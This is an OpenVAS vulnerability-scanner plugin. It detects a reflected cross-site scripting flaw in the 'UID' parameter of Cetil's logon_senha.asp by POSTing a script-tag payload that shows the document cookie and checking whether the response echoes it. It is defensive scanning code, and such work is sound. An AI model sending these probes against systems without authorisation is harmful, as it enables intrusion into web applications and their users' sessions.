###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cetil_login_xss_vuln.nasl 11402 2018-09-15 09:13:36Z cfischer $
#
# Cetil 'logon_senha.asp' Cross Site Scripting Vulnerability
#
# Authors:
# Antu Sanadi <santu@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804463");
  script_version("$Revision: 11402 $");
  script_bugtraq_id(67778);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 11:13:36 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2014-06-18 12:20:43 +0530 (Wed, 18 Jun 2014)");
  script_name("Cetil 'logon_senha.asp' Cross Site Scripting Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/93578");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/126881");

  script_tag(name:"summary", value:"This host is installed with Cetil and is prone to cross-site scripting
  vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP POST request and check whether it is able to read
  cookie or not.");

  script_tag(name:"insight", value:"This flaw is due to the logon_senha.asp script does not validate input to
  the 'UID' parameter before returning it to users.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML and
  script code in a user's browser session in the context of an affected site.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

http_port = get_http_port(default:80);
if( ! can_host_asp( port:http_port ) ) exit( 0 );

host = http_host_name(port:http_port);

foreach dir (make_list_unique("/", "/cetil", "/payment", "/gpweb", cgi_dirs(port:http_port))) {

  if(dir == "/") dir = "";

  sndReq = http_get(item:string(dir, "/logon_senha.asp"), port:http_port);
  rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

  if(rcvRes && '>CETIL -' >< rcvRes)
  {
    postdata = "UID=<script>alert(document.cookie)</script>&senha=&Submit=ok";

    sndReq = string("POST ", dir, "/logon_senha.asp HTTP/1.1\r\n",
                    "Host: ", host, "\r\n",
                    "Content-Type: application/x-www-form-urlencoded\r\n",
                    "Content-Length: ", strlen(postdata), "\r\n\r\n",
                    postdata);

    rcvRes = http_keepalive_send_recv(port:http_port, data:sndReq);

    if(rcvRes =~ "HTTP/1\.. 200" && "<script>alert(document.cookie)</script>" >< rcvRes &&
      ">CETIL" >< rcvRes)
    {
      security_message(port:http_port);
      exit(0);
    }
  }
}

exit(99);
